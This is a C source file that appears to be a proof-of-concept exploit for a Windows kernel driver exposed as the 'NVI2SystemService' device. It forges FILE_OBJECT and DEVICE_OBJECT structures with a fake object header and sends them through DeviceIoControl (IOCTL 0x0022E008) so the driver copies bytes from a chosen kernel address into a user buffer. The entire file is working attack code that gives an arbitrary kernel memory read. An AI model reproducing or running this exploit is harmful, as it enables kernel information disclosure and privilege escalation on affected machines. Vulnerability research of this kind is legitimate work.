#include <Windows.h>
#include <stdio.h>
#include <assert.h>

typedef SHORT CSHORT;
typedef void* PIO_TIMER;
typedef void* PVPB;
typedef void* PSECTION_OBJECT_POINTERS;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _DEVICE_OBJECT
{
    CSHORT Type; /* Must be 5 */
    USHORT Unused0;
    LONG Unused1;
    struct _DRIVER_OBJECT* Unused2;
    struct _DEVICE_OBJECT* Unused3;
    struct _DEVICE_OBJECT* Unused4;
    struct _IRP* Unused5;
    PIO_TIMER Unused6;
    ULONG Unused7;
    ULONG Unused8;
    __volatile PVPB Unused9;
    PVOID Unused10;
    /* This value is just copied around we will use it as a cookie to check if the operation succeeded */
    DEVICE_TYPE DeviceType;
} DEVICE_OBJECT, *PDEVICE_OBJECT;

typedef struct _DEVICE_OBJECT_WITH_FAKE_OBJECT_HEADER
{
    LONG Unused0;
    PVOID Unused1;
    PVOID Unused2;
    UCHAR TypeIndex;
    UCHAR Unused3;
    UCHAR Unused4;
    UCHAR Unused5;
    PVOID Unused6;
    PVOID Unused7;
    DEVICE_OBJECT DeviceObject;
} DEVICE_OBJECT_WITH_FAKE_OBJECT_HEADER, *PDEVICE_OBJECT_WITH_FAKE_OBJECT_HEADER;

typedef struct _FILE_OBJECT
{
    CSHORT Type; /* Must be 5 */
    CSHORT Unused0;
    PDEVICE_OBJECT DeviceObject; /* Point to fake DEVICE_OBJECT */
    PVPB Unused1;
    PVOID Unused2;
    PVOID Unused3;
    PSECTION_OBJECT_POINTERS Unused4;
    PVOID Unused5;
    NTSTATUS Unused6;
    struct _FILE_OBJECT* Unused7;
    BOOLEAN Unused9;
    BOOLEAN Unused10;
    BOOLEAN Unused11;
    BOOLEAN Unused12;
    BOOLEAN Unused13;
    BOOLEAN Unused14;
    BOOLEAN Unused15;
    BOOLEAN Unused16;
    ULONG Unused17;
    UNICODE_STRING FileName; /* FileName.Buffer for dist and FileName.Length for size */
} FILE_OBJECT, *PFILE_OBJECT;


typedef struct _DRIVER_INPUT
{
    PFILE_OBJECT FileObject; /* Points to fake FILE_OBJECT */
    CHAR Unused0[516];
    UCHAR Buffer[520];
    DEVICE_TYPE DeviceType; /* Don't care */
} DRIVER_INPUT, *PDRIVER_INPUT;


int main(void)
{
    assert(FIELD_OFFSET(DEVICE_OBJECT_WITH_FAKE_OBJECT_HEADER, DeviceObject) == 24);
    assert(sizeof(DRIVER_INPUT) == 1044);

    DEVICE_OBJECT_WITH_FAKE_OBJECT_HEADER DeviceObjectWithFakeObjectHeader = {0};
    // ReSharper disable once CppAssignedValueIsNeverUsed
    DeviceObjectWithFakeObjectHeader.TypeIndex = 3;
    DeviceObjectWithFakeObjectHeader.DeviceObject.Type = 3;
    DeviceObjectWithFakeObjectHeader.DeviceObject.DeviceType = 1337;

    FILE_OBJECT FileObject = {0};
    FileObject.Type = 5;
    FileObject.DeviceObject = &DeviceObjectWithFakeObjectHeader.DeviceObject;
    FileObject.FileName.Buffer = (PWCH)0x8c601ab0; /* Data in the kernel virtual address space */
    FileObject.FileName.Length = 24; /* Size of the data we want to copy */

    DRIVER_INPUT DriverInput = {0};
    DriverInput.FileObject = &FileObject;

    const HANDLE File = CreateFileW(L"\\\\.\\NVI2SystemService",
                                    GENERIC_READ | GENERIC_WRITE,
                                    0,
                                    NULL,
                                    OPEN_EXISTING,
                                    0,
                                    NULL);

    if (File == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr, "[!] CreateFileW failed\n");
        return -1;
    }

    DWORD BytesReturned;

    if (DeviceIoControl(File,
                        0x0022E008,
                        &DriverInput,
                        sizeof(PVOID),
                        &DriverInput,
                        sizeof(DriverInput),
                        &BytesReturned,
                        NULL) == FALSE && DriverInput.DeviceType != 1337)
    {
        fprintf(stderr, "[!] DeviceIoControl failed 0x%lx (%lu)\n", GetLastError(), DriverInput.DeviceType);
        CloseHandle(File);
        return -1;
    }

    wprintf(L"[!] Copy operation succeeded: Data copied '%.*ls'\n", 12, (PCWCHAR)DriverInput.Buffer);

    CloseHandle(File);

    return 0;
}
